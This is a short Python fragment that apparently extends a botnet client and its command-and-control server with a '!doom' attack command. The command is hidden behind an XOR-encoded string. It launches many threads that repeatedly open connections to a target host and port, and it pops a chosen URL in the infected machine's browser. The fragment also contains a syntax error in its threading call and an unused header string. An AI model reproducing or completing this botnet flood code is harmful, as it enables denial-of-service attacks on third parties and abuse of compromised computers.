#add to client and cnc
import webbrowser 
# url = 'https://www.youtube.com/watch?v=Tf1DEI2lEe0'
# webbrowser.open_new(url)

#for client, add above handle function

def doom(ip, url, port):
  global stop
  #url= 'https://www.youtube.com/watch?v=Tf1DEI2lEe0'
  while True:
    if stop :
            break
    try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect((str(ip),int(port)))
            if int(port) == 80 or int(port) == 443:
                    ctx = ssl.SSLContext()
                    s = ctx.wrap_socket(s,server_hostname=ip)
                    webbrowser.open_new(url)#not sure this is the best way
            connection = "Connection: Keep-Alive\r\n"
            s.send("\000".encode())
            s.close()
    except:
            pass
            
      

#open url command for client. should be added to the handle function
elif command[0] == xor_dec('QBcLCQo=',key):#encoded word !doom
  if attack != 0:
    stop = True
    attack = 0
  stop= False
  for _ in range(int(command[3])):
    p= threading.Thread(target=doom, args = command[1], command[2], command[4])#1=ip, 2=url, 3=threads 4=port
    p.start()
  attack+=1

#add in cnc line 242-256

sock.send('Doom: !doom host port threads\r\n'.encode())
